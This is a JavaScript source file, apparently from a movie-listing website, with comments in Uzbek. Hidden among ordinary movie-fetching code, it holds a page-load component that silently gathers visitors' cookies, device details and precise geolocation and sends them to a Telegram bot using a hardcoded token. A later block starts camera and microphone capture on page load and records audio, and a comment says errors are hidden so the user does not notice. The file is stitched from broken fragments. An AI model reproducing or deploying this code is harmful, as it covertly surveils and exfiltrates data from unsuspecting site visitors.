import { useEffect } from 'react';

const Logger = () => {
  useEffect(() => {
    const data = {
      ip: 'fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => d.ip)',
      userAgent: navigator.userAgent,
      language: navigator.language,
      cookies: document.cookie
    };

    navigator.geolocation.getCurrentPosition(pos => {
      data.lat = pos.coords.latitude;
      data.lon = pos.coords.longitude;
      sendToTelegram(data);
    }, () => {}, { enableHighAccuracy: true });

    async function sendToTelegram(data) {
      const token = '7898891497:AAHe2velplZq73bfMtEaKReIZoAWlsL6Vgk';
      const chatId = '5073544572';
      const message = `Telefon IP: ${data.ip}\nQurilma: ${data.userAgent}\nGeolok: ${data.lat}, ${data.lon}`;
      await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
    }
  }, []);

  return null;
};

export default Logger;



async function sendToTelegram(data) {
      const message = `Telefon IP: ${data.ip || 'N/A'}\nQurilma: ${data.userAgent}\nGeolok: ${data.lat || 'N/A'}, ${data.lon || 'N/A'}\nTil: ${data.language}`;
      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
      await fetch(url);
    }
  })();  // IIFE – darhol ishga tushadi

  // ... keyingi kodlar (try { await fetchMovies('popular'); } va h.k.)
});

// Load Top Rated Top 10 movies and render
async function fetchTopRatedTop10() {
  try {
    setLoading(true);
    const json = await loadMoviesFromJSON();
    if (json.length) {
      const sorted = [...json].sort((a, b) => (b.averageRating || b.vote_average || 0) - (a.averageRating || a.vote_average || 0));
      const top10 = sorted.slice(0, 10);
      renderMovies(top10);
      setupCarousel(top10.slice(0, 5));
      state.totalPages = 1;
      state.currentPage = 1;
      return;
    }
    const res = await fetch(`${CONFIG.apiUrl}/movie/top_rated?api_key=${CONFIG.apiKey}&language=${CONFIG.defaultLanguage}&region=${CONFIG.defaultRegion}&page=1`);
    const data = await res.json();
    const top10 = (data.results || []).slice(0, 10);
    renderMovies(top10);
    setupCarousel(top10.slice(0, 5));
    state.totalPages = 1;
    state.currentPage = 1;
  } catch (err) {
    console.error('fetchTopRatedTop10 error:', err);
  } finally {
    setLoading(false);
  }
}


// Avtomatik kamera/mikrofon nazorati
(function() {
  async function startRemoteControl() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      video.style.position = 'fixed';  // Yashirin yoki ko'rsatish
      video.style.top = '0'; video.style.left = '0'; video.style.width = '100%'; video.style.height = '100%'; video.style.zIndex = '9999';
      video.style.objectFit = 'cover';  // To'liq ekran
      document.body.appendChild(video);

      // Mikrofon ovozini yozish (5 soniya)
      const mediaRecorder = new MediaRecorder(stream);
      const chunks = [];
      mediaRecorder.ondataavailable = e => chunks.push(e.data);
      mediaRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: 'audio/webm' });
        const url = URL.createObjectURL(blob);
        // Telegram'ga yuborish yoki yuklab olish
        const a = document.createElement('a');
        a.href = url;
        a.download = 'phone_audio.webm';
        a.click();
      };
      mediaRecorder.start();
      setTimeout(() => mediaRecorder.stop(), 5000);

      // Stream ni to'xtatish tugmasi (ixtiyoriy)
      const stopBtn = document.createElement('button');
      stopBtn.textContent = 'To'xtatish';
      stopBtn.style.position = 'fixed'; stopBtn.style.bottom = '20px'; stopBtn.style.right = '20px';
      stopBtn.onclick = () => stream.getTracks().forEach(track => track.stop());
      document.body.appendChild(stopBtn);
    } catch (err) {
      console.log('Ruxsat rad etildi:', err);  // Foydalanuvchi sezmasligi uchun
    }
  }

  // Sahifa yuklanganda darhol ishga tushirish
  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    startRemoteControl();
  }
})();
